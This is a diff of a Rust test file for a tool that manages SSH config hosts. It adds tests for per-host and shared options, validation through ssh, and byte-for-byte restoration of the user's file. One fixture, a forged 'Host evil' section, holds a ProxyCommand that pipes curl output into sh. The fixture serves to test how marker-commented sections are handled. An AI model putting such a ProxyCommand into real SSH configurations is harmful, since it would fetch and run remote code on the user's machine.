@@ -7,13 +7,14 @@
 //! includes is read through a copy whose `~/` is the folder of the test.
 
 use std::collections::HashMap;
+use std::fmt::Write as _;
 use std::fs;
 use std::os::unix::fs::{PermissionsExt, symlink};
 use std::path::{Path, PathBuf};
 use std::process::Command;
 use std::sync::Arc;
 
-use hubergamof_protocol::{SshConfig, SshHost};
+use hubergamof_protocol::{AdvancedSetting, SshConfig, SshHost};
 
 use super::*;
 use crate::machine::FileError;
@@ -65,6 +66,7 @@ fn host(alias: &str) -> SshHost {
         proxy_jump: String::new(),
         forward_agent: false,
         enabled: true,
+        options: Vec::new(),
     }
 }
 
@@ -312,22 +314,70 @@ async fn a_host_that_is_off_from_the_start_is_commented_out_with_no_include() {
     assert_eq!(read(home, ".ssh/config"), original);
 }
 
+/// Accepted: whoever can write a marker in `~/.ssh/config` can write the option
+/// itself (`docs/security.md`), so a section with options written by the person
+/// is given back like any other.
 #[tokio::test]
-async fn a_marker_from_elsewhere_never_switches_a_program_on() {
+async fn a_section_commented_by_the_marker_is_given_back_whatever_options_it_holds() {
     let fixture = fixture();
     let home = fixture.home.path();
     let forged = "#hubergamof-off# Host evil\n#hubergamof-off# \tProxyCommand curl x | sh\n";
     fs::create_dir_all(home.join(".ssh")).unwrap();
     fs::write(home.join(".ssh/config"), forged).unwrap();
     saved(&fixture, |config| config.hosts = vec![host("a")]).await;
+    assert!(read(home, ".ssh/config").ends_with("Host evil\n\tProxyCommand curl x | sh\n"));
+}
+
+#[tokio::test]
+async fn a_section_commented_by_the_marker_with_what_cannot_be_carried_stays_commented() {
+    let fixture = fixture();
+    let home = fixture.home.path();
+    let forged = "#hubergamof-off# Host evil\n#hubergamof-off# \tIdentityFile a\n#hubergamof-off# \tIdentityFile b\n";
+    fs::create_dir_all(home.join(".ssh")).unwrap();
+    fs::write(home.join(".ssh/config"), forged).unwrap();
+    saved(&fixture, |config| config.hosts = vec![host("a")]).await;
     assert!(read(home, ".ssh/config").ends_with(forged));
+}
+
+#[tokio::test]
+async fn a_host_with_its_own_options_is_taken_over_and_really_switches_off_then_comes_back() {
+    let fixture = fixture();
+    let home = fixture.home.path();
+    let original = "Host tunnel\n\tHostName 192.0.2.20\n\tProxyCommand nc %h %p\n\tCompression yes\n\nHost web\n\tUser ada\n";
+    fs::create_dir_all(home.join(".ssh")).unwrap();
+    fs::write(home.join(".ssh/config"), original).unwrap();
+
+    // What the page does when the person takes the host over.
+    let system = fixture.hub.refresh().await.unwrap().system_hosts;
+    let tunnel = system.iter().find(|h| h.alias == "tunnel").unwrap();
+    assert_eq!(tunnel.lost_options, Vec::<String>::new());
+    let mut taken = server("tunnel", &tunnel.host_name, "");
+    taken.options = tunnel.options.clone();
+    saved(&fixture, |config| config.hosts = vec![taken]).await;
+
+    let config = read(home, ".ssh/config");
+    assert!(config.contains("#hubergamof-off# Host tunnel"));
+    assert!(config.contains("Host web\n\tUser ada\n"));
+    let managed = home.join(".config/hubergamof/ssh_config");
+    let read_back = ssh_reads(&managed, "tunnel");
     assert_eq!(
-        fs::read_to_string(home.join(".ssh/config"))
-            .unwrap()
-            .matches("\nProxyCommand")
-            .count(),
-        0
+        first(&read_back, "proxycommand").as_deref(),
+        Some("nc %h %p")
     );
+    assert_eq!(first(&read_back, "compression").as_deref(), Some("yes"));
+
+    // Off: gone from the computer, from where it came from too.
+    saved(&fixture, |config| config.hosts[0].enabled = false).await;
+    assert!(!home.join(".config/hubergamof/ssh_config").exists());
+    let effective = ssh_reads_home(home, "tunnel");
+    assert_ne!(
+        first(&effective, "proxycommand").as_deref(),
+        Some("nc %h %p")
+    );
+
+    // Removed from the configuration: back where it was.
+    saved(&fixture, |config| config.hosts.clear()).await;
+    assert_eq!(read(home, ".ssh/config"), original);
 }
 
 #[tokio::test]
@@ -347,7 +397,8 @@ async fn the_hosts_found_are_listed_and_what_hubergamof_wrote_is_not() {
         .map(|h| h.alias.as_str())
         .collect();
     assert_eq!(aliases, ["web", "tunnel"]);
-    assert_eq!(snapshot.system_hosts[1].other_options, ["proxycommand"]);
+    assert_eq!(snapshot.system_hosts[1].lost_options, Vec::<String>::new());
+    assert_eq!(snapshot.system_hosts[1].options[0].key, "ProxyCommand");
 
     saved(&fixture, |config| config.hosts = vec![host("mine")]).await;
     let snapshot = fixture.hub.refresh().await.unwrap();
@@ -553,7 +604,7 @@ async fn the_demo_works_in_a_temporary_home_and_lists_its_hosts() {
         .iter()
         .map(|h| h.alias.as_str())
         .collect();
-    assert_eq!(aliases, ["demo-server", "demo-tunnel"]);
+    assert_eq!(aliases, ["demo-server", "demo-tunnel", "demo-keys"]);
 
     let home: PathBuf = hub.target().unwrap().home().to_owned();
     assert!(home.starts_with(std::env::temp_dir()));
@@ -580,6 +631,8 @@ struct Cases {
     identity_files: Vec<Case>,
     #[serde(rename = "proxyJumps")]
     proxy_jumps: Vec<Case>,
+    #[serde(rename = "optionValues")]
+    option_values: Vec<Case>,
 }
 
 /// What the contract accepts must not make `ssh` refuse the configuration: it
@@ -622,6 +675,11 @@ async fn every_value_the_contract_accepts_is_read_by_ssh_without_an_error() {
         found.proxy_jump = jumps;
         hosts.push(found);
     }
+    for (index, value) in valid(&cases.option_values).into_iter().enumerate() {
+        let mut found = host(&format!("option{index}"));
+        found.options = vec![option("SendEnv", &value)];
+        hosts.push(found);
+    }
     assert!(hosts.len() <= hubergamof_protocol::MAX_SSH_HOSTS);
 
     let fixture = fixture();
@@ -641,7 +699,7 @@ async fn a_name_used_by_a_host_with_options_hubergamof_does_not_manage_is_refuse
  {
     let fixture = fixture();
     let home = fixture.home.path();
-    let original = "Host work\n\tHostName w.example.org\n\tProxyCommand nc -X 5 %h %p\n";
+    let original = "Host work\n\tHostName w.example.org\n\tIdentityFile k1\n\tIdentityFile k2\n";
     fs::create_dir_all(home.join(".ssh")).unwrap();
     fs::write(home.join(".ssh/config"), original).unwrap();
 
@@ -656,7 +714,7 @@ async fn a_name_used_by_a_host_with_options_hubergamof_does_not_manage_is_refuse
     assert_eq!(
         read(home, ".ssh/config"),
         original,
-        "its ProxyCommand is not lost"
+        "its second IdentityFile is not lost"
     );
     assert!(
         !home.join(".config/hubergamof/ssh_config").exists(),
@@ -666,7 +724,7 @@ async fn a_name_used_by_a_host_with_options_hubergamof_does_not_manage_is_refuse
     // Another name is fine, and the host stays listed as one that cannot be taken.
     saved(&fixture, |config| config.hosts = vec![host("other")]).await;
     let snapshot = fixture.hub.refresh().await.unwrap();
-    assert_eq!(snapshot.system_hosts[0].other_options, ["proxycommand"]);
+    assert_eq!(snapshot.system_hosts[0].lost_options, ["identityfile"]);
     assert!(read(home, ".ssh/config").ends_with(original));
 }
 
@@ -712,4 +770,339 @@ async fn a_host_with_a_comment_after_its_name_is_taken_over_and_really_switches_
     );
     saved(&fixture, |config| config.hosts.clear()).await;
     assert_eq!(read(home, ".ssh/config"), original);
+}
+
+fn option(key: &str, value: &str) -> AdvancedSetting {
+    AdvancedSetting {
+        key: key.into(),
+        value: value.into(),
+        enabled: true,
+    }
+}
+
+#[tokio::test]
+async fn ssh_reads_back_the_options_of_a_host_and_the_common_ones() {
+    let fixture = fixture();
+    let managed = fixture.home.path().join(".config/hubergamof/ssh_config");
+    saved(&fixture, |config| {
+        let mut prod = server("prod", "10.0.0.1", "deploy");
+        prod.options = vec![
+            option("Compression", "yes"),
+            option("ServerAliveInterval", "15"),
+            AdvancedSetting {
+                enabled: false,
+                ..option("LogLevel", "DEBUG")
+            },
+        ];
+        config.hosts = vec![prod, host("bare")];
+        config.common_options = vec![
+            option("ServerAliveInterval", "60"),
+            option("ServerAliveCountMax", "5"),
+        ];
+    })
+    .await;
+
+    let prod = ssh_reads(&managed, "prod");
+    assert_eq!(first(&prod, "compression").as_deref(), Some("yes"));
+    assert_eq!(
+        first(&prod, "serveraliveinterval").as_deref(),
+        Some("15"),
+        "the host wins over the common options"
+    );
+    assert_eq!(first(&prod, "serveralivecountmax").as_deref(), Some("5"));
+    assert_ne!(first(&prod, "loglevel").as_deref(), Some("DEBUG"));
+    let bare = ssh_reads(&managed, "bare");
+    assert_eq!(first(&bare, "serveraliveinterval").as_deref(), Some("60"));
+    assert_ne!(first(&bare, "compression").as_deref(), Some("yes"));
+}
+
+#[tokio::test]
+async fn an_option_is_free_whatever_it_does() {
+    let fixture = fixture();
+    let managed = fixture.home.path().join(".config/hubergamof/ssh_config");
+    saved(&fixture, |config| {
+        let mut tunnel = host("tunnel");
+        tunnel.options = vec![option("ProxyCommand", "ssh -W %h:%p bastion")];
+        config.hosts = vec![tunnel];
+    })
+    .await;
+    assert_eq!(
+        first(&ssh_reads(&managed, "tunnel"), "proxycommand").as_deref(),
+        Some("ssh -W %h:%p bastion")
+    );
+}
+
+#[tokio::test]
+async fn options_ssh_cannot_read_are_refused_and_what_was_applied_stays() {
+    type Change = fn(&mut SshConfig);
+    let cases: [(&str, Change, &str, &str); 3] = [
+        (
+            "unknown option on a host",
+            |config| config.hosts[0].options = vec![option("Compresion", "yes")],
+            "a",
+            "Bad configuration option",
+        ),
+        (
+            "bad value on a host",
+            |config| config.hosts[0].options = vec![option("Compression", "maybe")],
+            "a",
+            "unsupported option",
+        ),
+        (
+            "unknown common option",
+            |config| config.common_options = vec![option("Nope", "1")],
+            "*",
+            "Bad configuration option",
+        ),
+    ];
+    for (what, change, scope, message) in cases {
+        let fixture = fixture();
+        let home = fixture.home.path();
+        saved(&fixture, |config| {
+            config.hosts = vec![server("a", "good.example.org", "u")];
+        })
+        .await;
+        let managed = home.join(".config/hubergamof/ssh_config");
+        let before = fs::read_to_string(&managed).unwrap();
+
+        let mut config = fixture.hub.refresh().await.unwrap().config;
+        change(&mut config);
+        let error = fixture.hub.update(config).await.unwrap_err();
+        let SshError::Apply(SshFilesError::Rejected {
+            scope: found_scope,
+            message: found_message,
+        }) = &error
+        else {
+            panic!("{what}: {error}");
+        };
+        assert_eq!(found_scope, scope, "{what}");
+        assert!(found_message.contains(message), "{what}: {found_message}");
+        assert!(!found_message.contains(home.to_str().unwrap()), "{what}");
+        assert_eq!(fs::read_to_string(&managed).unwrap(), before, "{what}");
+        assert!(
+            !home.join(".config/hubergamof/ssh_config.check").exists(),
+            "{what}: the trial file is removed"
+        );
+    }
+}
+
+#[tokio::test]
+async fn options_that_are_off_are_not_tried() {
+    let fixture = fixture();
+    saved(&fixture, |config| {
+        let mut broken = host("a");
+        broken.options = vec![AdvancedSetting {
+            enabled: false,
+            ..option("Nope", "1")
+        }];
+        config.hosts = vec![broken];
+    })
+    .await;
+    let managed = fixture.home.path().join(".config/hubergamof/ssh_config");
+    assert!(!read_to_string_lossy(&managed).contains("Nope"));
+}
+
+fn read_to_string_lossy(path: &Path) -> String {
+    fs::read_to_string(path).unwrap()
+}
+
+#[tokio::test]
+async fn common_options_alone_are_written_and_removed_with_the_include() {
+    let fixture = fixture();
+    let home = fixture.home.path();
+    saved(&fixture, |config| {
+        config.common_options = vec![option("Compression", "yes")];
+    })
+    .await;
+    assert!(read(home, ".config/hubergamof/ssh_config").contains("Host *\n\tCompression yes\n"));
+    assert!(read(home, ".ssh/config").contains("Include"));
+    saved(&fixture, |config| config.common_options.clear()).await;
+    assert!(!home.join(".config/hubergamof/ssh_config").exists());
+    assert!(!home.join(".ssh/config").exists());
+}
+
+/// What the contract refuses for its quotes is what `ssh` refuses the whole
+/// configuration for: the rule is not stricter than it must be, except for the
+/// two cases the contract keeps out on purpose.
+#[tokio::test]
+async fn a_value_with_quotes_that_do_not_pair_up_is_refused_by_ssh_itself() {
+    require_ssh();
+    let dir = tempfile::tempdir().unwrap();
+    let cases: Cases = serde_json::from_str(include_str!(
+        "../../../../protocol/tests/fixtures/ssh-validation.json"
+    ))
+    .unwrap();
+    for case in cases
+        .option_values
+        .iter()
+        .filter(|case| !case.valid && case.value.matches(['"', '\'']).count() % 2 == 1)
+    {
+        let file = dir.path().join("config");
+        fs::write(&file, format!("Host a\n\tSendEnv {}\n", case.value)).unwrap();
+        let output = Command::new("ssh")
+            .arg("-F")
+            .arg(&file)
+            .args(["-G", "a"])
+            .env_clear()
+            .env("PATH", std::env::var_os("PATH").unwrap())
+            .output()
+            .unwrap();
+        assert!(!output.status.success(), "{:?}", case.value);
+    }
+}
+
+#[tokio::test]
+async fn a_refused_option_stays_saved_and_blocks_every_later_change_until_it_is_removed() {
+    let fixture = fixture();
+    let home = fixture.home.path();
+    saved(&fixture, |config| {
+        config.hosts = vec![server("a", "a.example.org", "u")];
+    })
+    .await;
+    let managed = home.join(".config/hubergamof/ssh_config");
+    let applied = fs::read_to_string(&managed).unwrap();
+
+    let mut broken = fixture.hub.refresh().await.unwrap().config;
+    broken.common_options = vec![option("Nope", "1")];
+    let error = fixture.hub.update(broken).await.unwrap_err();
+    assert!(matches!(
+        error,
+        SshError::Apply(SshFilesError::Rejected { .. })
+    ));
+    assert_eq!(
+        error.error_code(),
+        hubergamof_protocol::ErrorCode::NotApplied
+    );
+    let after = fixture.hub.refresh().await.unwrap().config;
+    assert_eq!(after.revision, 2, "saved all the same");
+    assert_eq!(after.common_options.len(), 1);
+    assert_eq!(fs::read_to_string(&managed).unwrap(), applied);
+
+    // A change that has nothing to do with it is saved but not applied either.
+    let mut unrelated = after.clone();
+    unrelated.hosts.push(host("b"));
+    assert!(fixture.hub.update(unrelated).await.is_err());
+    assert_eq!(fs::read_to_string(&managed).unwrap(), applied);
+
+    // Removing it puts everything on the computer.
+    let mut fixed = fixture.hub.refresh().await.unwrap().config;
+    fixed.common_options.clear();
+    fixture.hub.update(fixed).await.unwrap();
+    assert!(fs::read_to_string(&managed).unwrap().contains("Host b\n"));
+}
+
+#[tokio::test]
+async fn a_host_added_by_hand_under_the_name_of_a_section_with_options_is_refused_not_merged() {
+    let fixture = fixture();
+    let home = fixture.home.path();
+    let original =
+        "Host prod\n\tStrictHostKeyChecking yes\n\tUserKnownHostsFile ~/.ssh/known_prod\n";
+    fs::create_dir_all(home.join(".ssh")).unwrap();
+    fs::write(home.join(".ssh/config"), original).unwrap();
+
+    // A host of that name that does not say what the section says would hide it.
+    let mut config = fixture.hub.refresh().await.unwrap().config;
+    config.hosts = vec![host("prod")];
+    let error = fixture.hub.update(config).await.unwrap_err();
+    assert!(
+        matches!(error, SshError::Apply(SshFilesError::NameInUse(ref names)) if *names == ["prod"]),
+        "{error}"
+    );
+    assert_eq!(
+        read(home, ".ssh/config"),
+        original,
+        "the hardening is not lost"
+    );
+
+    // One that says it all is the host taken over.
+    let system = fixture.hub.refresh().await.unwrap().system_hosts;
+    let mut taken = host("prod");
+    taken.options = system[0].options.clone();
+    saved(&fixture, |config| config.hosts = vec![taken]).await;
+    assert!(read(home, ".ssh/config").contains("#hubergamof-off# Host prod"));
+}
+
+#[tokio::test]
+async fn a_host_taken_over_with_what_the_file_holds_comes_back_byte_for_byte() {
+    for original in [
+        "Host a\r\n\tSetEnv=A=1\r\n\tSendEnv \"X Y\"\r\n\tCompression yes",
+        "Host a\n\tLogLevel  =ERROR\n\tProxyCommand nc %h %p # via\n\n",
+        "Include other\n\nHost a\n\tLogLevel ERROR\n\tCompression=yes\n",
+    ] {
+        let fixture = fixture();
+        let home = fixture.home.path();
+        fs::create_dir_all(home.join(".ssh")).unwrap();
+        fs::write(home.join(".ssh/config"), original).unwrap();
+        let system = fixture.hub.refresh().await.unwrap().system_hosts;
+        let found = system.iter().find(|h| h.alias == "a").unwrap();
+        assert_eq!(found.lost_options, Vec::<String>::new(), "{original:?}");
+        let mut taken = host("a");
+        taken.options = found.options.clone();
+        saved(&fixture, |config| config.hosts = vec![taken]).await;
+
+        let managed = home.join(".config/hubergamof/ssh_config");
+        let read_back = ssh_reads(&managed, "a");
+        for option in &found.options {
+            let lower = option.key.to_ascii_lowercase();
+            assert!(read_back.contains_key(&lower), "{original:?}: {lower}");
+        }
+        saved(&fixture, |config| config.hosts[0].enabled = false).await;
+        let effective = ssh_reads_home(home, "a");
+        assert_ne!(
+            first(&effective, "compression").as_deref(),
+            Some("yes"),
+            "{original:?}"
+        );
+        saved(&fixture, |config| config.hosts.clear()).await;
+        assert_eq!(read(home, ".ssh/config"), original, "{original:?}");
+    }
+}
+
+/// `ssh` takes one `=` as the separator, whatever follows is the value.
+#[tokio::test]
+async fn ssh_reads_the_value_after_one_equal_sign_as_the_parser_of_hubergamof_does() {
+    require_ssh();
+    let dir = tempfile::tempdir().unwrap();
+    let file = dir.path().join("config");
+    fs::write(&file, "Host a\n\tSetEnv  ==x\n").unwrap();
+    assert_eq!(
+        first(&ssh_reads(&file, "a"), "setenv").as_deref(),
+        Some("=x")
+    );
+}
+
+#[tokio::test]
+async fn a_host_with_as_many_options_as_a_list_holds_is_taken_over_and_written() {
+    let fixture = fixture();
+    let home = fixture.home.path();
+    let mut original = String::from("Host a\n");
+    let keywords: Vec<String> = (0..hubergamof_protocol::MAX_ADVANCED_SETTINGS)
+        .map(|i| format!("SendEnv{i}"))
+        .collect();
+    for keyword in &keywords {
+        writeln!(original, "\t{keyword} x").unwrap();
+    }
+    fs::create_dir_all(home.join(".ssh")).unwrap();
+    fs::write(home.join(".ssh/config"), &original).unwrap();
+    let system = fixture.hub.refresh().await.unwrap().system_hosts;
+    assert_eq!(
+        system[0].options.len(),
+        hubergamof_protocol::MAX_ADVANCED_SETTINGS
+    );
+    // `ssh` does not know these keywords: the contract accepts them, `ssh` is the judge of the file.
+    let mut taken = host("a");
+    taken.options = system[0].options.clone();
+    let error = fixture
+        .hub
+        .update({
+            let mut config = fixture.hub.refresh().await.unwrap().config;
+            config.hosts = vec![taken];
+            config
+        })
+        .await
+        .unwrap_err();
+    assert!(
+        matches!(error, SshError::Apply(SshFilesError::Rejected { .. })),
+        "{error}"
+    );
 }
